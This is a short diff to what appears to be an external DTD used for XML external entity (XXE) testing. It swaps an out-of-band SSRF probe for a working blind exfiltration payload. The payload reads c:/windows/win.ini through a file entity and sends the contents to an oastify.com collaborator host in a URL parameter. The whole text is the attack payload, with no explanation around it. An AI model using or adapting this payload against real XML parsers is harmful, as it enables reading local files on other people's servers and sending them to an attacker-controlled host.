@@ -1,1 +1,4 @@
-<!DOCTYPE hackmetrix [<!ENTITY % ssrf SYSTEM "http://oh9w3rcxksnp53ta80d5p3nznqthha5z.oastify.com/">%ssrf;]>
+<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://jk7r6mfsnnqk8yw5bvg0syquqlwck68v.oastify.com/?HACKMETRIX=%file;'>">
+%eval;
+%exfil;
